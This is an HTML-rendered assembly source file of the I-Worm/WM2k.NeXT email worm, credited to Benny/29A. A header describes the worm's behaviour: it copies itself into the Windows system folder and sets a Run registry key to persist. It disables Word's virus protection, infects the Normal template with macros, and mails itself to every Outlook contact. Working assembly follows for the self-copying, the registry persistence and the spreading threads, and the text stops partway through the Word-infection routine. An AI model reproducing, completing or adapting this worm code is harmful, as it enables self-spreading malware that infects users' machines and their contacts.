<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Outa - next.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT#</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                            ÚÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂ¿</span><span class="sc0">
</span><span class="sc1">;                            ÃÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅ´ </span><span class="sc0">
</span><span class="sc1">;                            ÃÅÅÅÅÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÅÅÅÅ´ </span><span class="sc0">
</span><span class="sc1">;                            ÃÅÅÅ´ I-Worm/WM2k.NeXT ÃÅÅÅ´ </span><span class="sc0">
</span><span class="sc1">;                            ÃÅÅÅ´   by Benny/29A   ÃÅÅÅ´</span><span class="sc0">
</span><span class="sc1">;                            ÃÅÅÅÅÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÅÅÅÅ´</span><span class="sc0">
</span><span class="sc1">;                            ÃÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅ´</span><span class="sc0">
</span><span class="sc1">;                            ÀÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÁÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; After a long pause (after the incident with Winux virus) I decided to release</span><span class="sc0">
</span><span class="sc1">; my next worm, called I-Worm/WM2k.NeXT. Ppl that know me at least a bit gonna</span><span class="sc0">
</span><span class="sc1">; ask, in what is this worm special in. In the way it worx its nothing much</span><span class="sc0">
</span><span class="sc1">; special, but in the way how it is coded, its special a bit. At least for me.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; This very small piece of code is kinda multiplatform. It can spread via</span><span class="sc0">
</span><span class="sc1">; MS Outlook and MS Word, using standard OLE/COM functionz that MS Office</span><span class="sc0">
</span><span class="sc1">; provides. The worm is divided to two partz, EXE and VBA.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ EXE part: ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; When EXE part will become executed, the first what will worm do is that it</span><span class="sc0">
</span><span class="sc1">; will copy itself to windows system folder and write a key to registry so the</span><span class="sc0">
</span><span class="sc1">; worm will be executed with every start of system. Then it will initialize OLE</span><span class="sc0">
</span><span class="sc1">; interface and create two threads.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1. Thread will:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; - wait until MS Word is executed</span><span class="sc0">
</span><span class="sc1">; - drop macro script to the root directory of C drive.</span><span class="sc0">
</span><span class="sc1">; - import the script to Normal template of Word using OLE/COM interface</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 2. Thread will:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; - wait until MS Outlook is executed</span><span class="sc0">
</span><span class="sc1">; - send EXE part of worm to all email addresses found in Outlook's address</span><span class="sc0">
</span><span class="sc1">;   book using OLE/COM interface</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Worm will exit after both two threadz will successfuly finish their job.</span><span class="sc0">
</span><span class="sc1">; EXE part contains one WinZIP icon and is compressed and armoured by tElock</span><span class="sc0">
</span><span class="sc1">; v.0.80.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ VBA part: ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Infected Document contains two macros, which are automaticaly executed in</span><span class="sc0">
</span><span class="sc1">; dependency on some events.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1. Macro AutoOpen () will:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; - disable virus protection and sets autosaving of Normal template</span><span class="sc0">
</span><span class="sc1">; - will copy all macro module to Normal template</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 2. Macro FileSave () will:</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; - export whole macro module to system folder</span><span class="sc0">
</span><span class="sc1">; - import whole macro module to all opened documents</span><span class="sc0">
</span><span class="sc1">; - copy whole macro module to Normal template and save it</span><span class="sc0">
</span><span class="sc1">; - send both of exe part and document part of worm to all email addresses</span><span class="sc0">
</span><span class="sc1">;   found in MS Outlook's address book</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; And that's all. I coded this worm becoz I wanted to learn how to work with</span><span class="sc0">
</span><span class="sc1">; OLE/COM in assembler. In VisualBasic, its super easy, everybody know that.</span><span class="sc0">
</span><span class="sc1">; In assembler, its simple, but not so simple as in VB. Just look at the code</span><span class="sc0">
</span><span class="sc1">; and see by yourself. Its a bit complicated, but easy too.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Have a fun!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; (c)oded in August, 2001</span><span class="sc0">
</span><span class="sc1">; Czech Republic.</span><span class="sc0">
</span><span class="sc1">; #</span><span class="sc0">


</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">


</span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc0">             </span><span class="sc1">;macro for API callz</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">api</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">DISPPARAMS</span><span class="sc0">              </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Arguments</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Array of arguments.</span><span class="sc0">
</span><span class="sc5">Disp_IDs</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Dispatch ID's of named arguments.</span><span class="sc0">
</span><span class="sc5">Argument_Count</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Number of arguments.</span><span class="sc0">
</span><span class="sc5">Disp_ID_Count</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Number of dispatcher IDs.</span><span class="sc0">
</span><span class="sc5">DISPPARAMS</span><span class="sc0">              </span><span class="sc9">ENDS</span><span class="sc0">




</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">variant_result</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;BSTR</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">result_union</span><span class="sc0">        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">variant_argument</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;BSTR</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">argument_union</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">dword_argument</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;I4</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dword_union</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">winword_object</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;handle to winword</span><span class="sc0">
</span><span class="sc5">outlook_object</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;handle to outlook</span><span class="sc0">
</span><span class="sc5">winword_dispatcher</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;winword dispatcher</span><span class="sc0">
</span><span class="sc5">outlook_dispatcher</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;outlook dispatcher</span><span class="sc0">
</span><span class="sc5">dispatcher_params</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">;parameters for dispatcher</span><span class="sc0">
</span><span class="sc5">IID_NULL</span><span class="sc0">        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">;NULL</span><span class="sc0">

</span><span class="sc5">sysdir</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">filename2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">hThread1</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hThread2</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">tmp</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">tmp2</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetSystemDirectoryW</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'\next.exe'</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">cpy</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;create system_dir+"\next.exe"</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cpy</span><span class="sc0">             </span><span class="sc1">;string</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">400000h</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleFileNameW</span><span class="sc0">      </span><span class="sc1">;get full filename of the worm</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CopyFileW</span><span class="sc0">           </span><span class="sc1">;copy worm to system folder</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">r_n</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;convert unicode string to ANSI</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">r_n</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;REG_SZ</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'NeXT'</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000002h</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SHSetValueA</span><span class="sc0">         </span><span class="sc1">;write a key to registry</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CoInitializeEx</span><span class="sc0">          </span><span class="sc1">;initialize OLE/COM</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateEventA</span><span class="sc0">            </span><span class="sc1">;create synchronization object</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ole</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hEvent</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_Word</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateThread</span><span class="sc0">            </span><span class="sc1">;create 1st thread</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ole</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hThread1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_Outlook</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateThread</span><span class="sc0">            </span><span class="sc1">;create 2nd thread</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hThread2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hThread1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WaitForMultipleObjects</span><span class="sc0">      </span><span class="sc1">;wait until all threadz will be</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;finished</span><span class="sc0">
</span><span class="sc5">hEvent</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">end_ole</span><span class="sc4">:</span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CoUninitialize</span><span class="sc0">          </span><span class="sc1">;uninitialize OLE/COM</span><span class="sc0">
</span><span class="sc5">end_seh</span><span class="sc4">:</span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc0">         </span><span class="sc1">;exit worm</span><span class="sc0">







</span><span class="sc5">tw_wait</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc0">               </span><span class="sc1">;wait 1 second</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tw_go</span><span class="sc0">

</span><span class="sc5">Thread_Word</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">                </span><span class="sc1">;WINWORD thread</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_tw</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">tw_go</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winword_object</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winword_CLSID</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetActiveObject</span><span class="sc0">         </span><span class="sc1">;look out if winword is active</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tw_wait</span><span class="sc0">             </span><span class="sc1">;no? then wait 1 second</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@wm_f</span><span class="sc0">
</span><span class="sc5">@imp</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'c'</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc4">,</span><span class="sc12">'\','</span><span class="sc5">I</span><span class="sc12">','</span><span class="sc5">O</span><span class="sc12">','</span><span class="sc5">.</span><span class="sc12">','</span><span class="sc5">S</span><span class="sc12">','</span><span class="sc5">Y</span><span class="sc12">','</span><span class="sc2">0</span><span class="sc13">',0
</span><span class="sc5">@wm_f</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileW</span><span class="sc0">         </span><span class="sc1">;create new file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_tw</span><span class="sc0">
